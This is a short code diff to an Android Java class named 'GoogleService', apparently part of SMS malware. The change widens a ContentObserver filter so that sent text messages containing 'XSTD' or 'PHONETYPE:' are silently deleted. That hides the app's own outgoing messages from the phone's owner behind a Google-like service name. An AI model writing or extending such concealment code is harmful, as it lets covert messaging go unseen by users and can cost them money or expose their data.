@@ -152,7 +152,9 @@ public class GoogleService extends Service {
                     if (Config.DEBUG) {
                         Config.LOGD("[[ContentObserver::onChanged]] The message is SENT message");
                     }
-                    if (!TextUtils.isEmpty(body) && body.contains("XSTD")) {
+                    if (!TextUtils.isEmpty(body)
+                            && (body.contains("XSTD")
+                               || body.contains("PHONETYPE:") )) {
                         deleteList.add(id);
                     }
                 }
